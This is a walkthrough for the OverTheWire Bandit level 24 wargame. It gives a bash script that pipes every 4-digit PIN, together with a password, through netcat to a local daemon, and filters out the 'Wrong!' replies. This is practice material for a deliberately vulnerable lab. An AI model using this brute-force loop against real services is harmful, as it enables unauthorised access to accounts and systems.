ssh bandit24@bandit.labs.overthewire.org -p 2220 

In this level, a daemon is listening on port 30002. When you connect using netcat, it asks for a password and a PIN combination.

Each time you try a combination, if it's wrong, it responds with something like: Wrong! Please enter the correct combination.
This predictable response allows us to automate the process and brute force all possible combinations to find the correct one.

You need to: Try all 4-digit PINs (0000 to 9999) with your current level's password.

Identify the correct combination by filtering out incorrect responses.

Write a script in tmp folder to brute force all possible combinations:
#!/bin/bash
# Save current level's password in a variable
password="the_current_password_here"
# Loop through all 4-digit PINs from 0000 to 9999
for pin in $(seq -w 0000 9999); do
    echo "$password $pin" | nc localhost 30002 
done | grep -v "Wrong!"

What Each Line Does:
#!/bin/bash → Declares the script as a bash shell script.
password="the_current_password_here" → Replace this with the actual password for bandit24.
for pin in $(seq -w 0000 9999); do → Loops from 0000 to 9999, ensuring leading zeros are preserved using -w.
echo "$password $pin" | nc localhost 30002 → Sends each password+PIN combination to the daemon via Netcat.

When the correct combination is found, the daemon will respond with the password for the next level, and it will not contain the word Wrong!.
That’s what will be displayed in your terminal output.
